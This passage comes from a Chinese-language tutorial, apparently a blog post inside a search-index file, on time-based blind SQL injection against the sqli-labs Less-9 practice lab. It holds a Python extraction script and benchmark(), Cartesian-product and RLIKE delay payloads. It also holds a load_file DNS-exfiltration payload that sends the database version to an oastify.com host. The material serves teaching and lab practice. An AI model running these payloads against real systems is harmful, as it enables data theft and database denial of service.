class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br>        start = time.time()   <span class="hljs-comment">#获取执行前时间</span><br>        requests.get(<span class="hljs-string">f&quot;http://127.0.0.22/Less-9/?id=1&#x27; and if(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where table_schema = schema() and table_name = &#x27;<span class="hljs-subst">&#123;table_name&#125;</span>&#x27;),<span class="hljs-subst">&#123;i&#125;</span>,1) = &#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">chr</span>(j)&#125;</span>&#x27;,sleep(2),sleep(0)) --+&quot;</span>)<br>        end = time.time()   <span class="hljs-comment">#获取完成后的时间</span><br>        <span class="hljs-keyword">if</span>(end - start) &gt; <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j).lower(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment">#猜测字段长度</span><br>data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;\n请输入您想查的数据&#x27;</span>)<br>data_len = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    start = time.time()<br>    requests.get(<span class="hljs-string">f&quot;http://127.0.0.22/Less-9/?id=1&#x27; and if(length((select group_concat(<span class="hljs-subst">&#123;data&#125;</span>) from <span class="hljs-subst">&#123;table_name&#125;</span>))=<span class="hljs-subst">&#123;i&#125;</span>,sleep(2),sleep(0)) --+&quot;</span>)<br>    end = time.time()<br>    <span class="hljs-keyword">if</span>(end-start)&gt;<span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\n<span class="hljs-subst">&#123;data&#125;</span>的长度是：<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>)<br>        data_len = i<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,data_len+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        start = time.time()<br>        requests.get(<span class="hljs-string">f&quot;http://127.0.0.22/Less-9/?id=1&#x27; and if(substr((select group_concat(<span class="hljs-subst">&#123;data&#125;</span>) from <span class="hljs-subst">&#123;table_name&#125;</span>),<span class="hljs-subst">&#123;i&#125;</span>,1) =&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">chr</span>(j)&#125;</span>&#x27;,sleep(2),sleep(0)) --+&quot;</span>)<br>        end = time.time()<br>        <span class="hljs-keyword">if</span>(end-start)&gt;<span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j).lower(),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><h2 id="二、基于benchmark-的注入"><a href="#二、基于benchmark-的注入" class="headerlink" title="二、基于benchmark()的注入"></a>二、基于benchmark()的注入</h2><p>**<code>benchmark(a,b)：</code>**将b重复执行a次(通过增大a让数据库执行多次也会造成延时)</p><p>payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; and benchmark(10000,select length(schema())=&#123;1&#125;)--+</span><br></code></pre></td></tr></table></figure><p>因为是“与”条件，所以只需要变换1来猜解数据库长度即可，只有查询正确才会延时。</p><h2 id="三、数据外带"><a href="#三、数据外带" class="headerlink" title="三、数据外带"></a>三、数据外带</h2><p><strong>数据外带利用条件：</strong></p><ul><li>拥有读写权限</li><li>Windows操作系统</li></ul><p>利用函数：</p><p><strong><code>load_file()</code> 读取文件</strong>—&gt;括号内部参数为所要读取的文件目录</p><p><strong><code>concat</code>：拼接</strong>（将反斜杠和后面的字符串进行拼接）</p><p>payload如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">load_file(concat(<span class="hljs-string">&#x27;\\&#x27;</span>,(<span class="hljs-keyword">select</span> version()),<span class="hljs-string">&#x27;.gxh8pxl2n1azosrclm4398nxmosfg4.oastify.com\a.txt&#x27;</span>))<br></code></pre></td></tr></table></figure><p>其中<code>.gxh8pxl2n1azosrclm4398nxmosfg4.oastify.com</code>为dnslog地址</p><p>注意：必须给地址后面加任意文件，哪怕不存在。目的是为了让服务器去发起请求</p><h2 id="四、构造大笛卡尔积进行注入"><a href="#四、构造大笛卡尔积进行注入" class="headerlink" title="四、构造大笛卡尔积进行注入"></a>四、构造大笛卡尔积进行注入</h2><p><strong>笛卡尔算积：</strong></p><p><img src="https://ice.frostsky.com/2023/08/15/07fbb50dd6cdea17b65299760551971c.png" alt="img"></p><p>也就是说数字1先去乘以ABC，然后数字2再去乘以ABC，然后数字3再去乘以ABC，其实就是Burp suite里面的Intruder模块的Attack type里面的Clutser bomb攻击方式。</p><p><strong>大负荷查询</strong></p><p>Mysql支持这种运算方式，我们的思路是让Mysql进行笛卡尔算积使其造成大负荷查询达到延时的效果。</p><p>既然要用笛卡尔算积就要需要大额的数值来计算，在mysql数据库中都有information_schema这个表，这个表里面的数据还是蛮多的，查询一下数量</p><p><img src="https://ice.frostsky.com/2023/08/15/c12ce4f5a4aeee85a865b9dccfea13ce.png" alt="img"></p><p>然后我们进行笛卡尔积运算，不难发现数值的大小影响了计算的速度，通过采用1个表2个列，或者2个列一个表，等等各种组合找出合适的延时的时间。</p><p><img src="https://ice.frostsky.com/2023/08/15/33ff06817f1d3c0263cf51a89abf6a00.png" alt="img"></p><p>这里给出payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>)  <span class="hljs-keyword">FROM</span> information_schema.columns A, information_schema.columns B,  information_schema.tables C);<br></code></pre></td></tr></table></figure><p>你完全可以按照这个规律，从C后面加个逗号，写D，E等等等，想写多少就写多少，但是写的越多查询的速度就会越慢，如果在表或者列数量很少的情况下，可以写的多一点。</p><h2 id="五、正则DOS-RLIKE注入"><a href="#五、正则DOS-RLIKE注入" class="headerlink" title="五、正则DOS RLIKE注入"></a>五、正则DOS RLIKE注入</h2><p>延时原理，利用SQL多次计算正则消耗计算资源产生延时效果，其实原理是和我们的benchmark注入差不多的。</p><p>利用手法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">where</span> flag<span class="hljs-operator">=</span>’<span class="hljs-number">1</span>′ <span class="hljs-keyword">and</span> if(mid(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span>’s’,concat(rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’)) RLIKE ‘(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>b’,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>+——+</p><p>| flag |</p><p>+——+</p><p>| 1  |</p><p>+——+</p><p>1 row in set (0.00 sec)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">where</span> flag<span class="hljs-operator">=</span>’<span class="hljs-number">1</span>′ <span class="hljs-keyword">and</span> if(mid(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span>’r’,concat(rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,’a’)) RLIKE ‘(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>cd’,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>Empty set (3.83 sec)</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
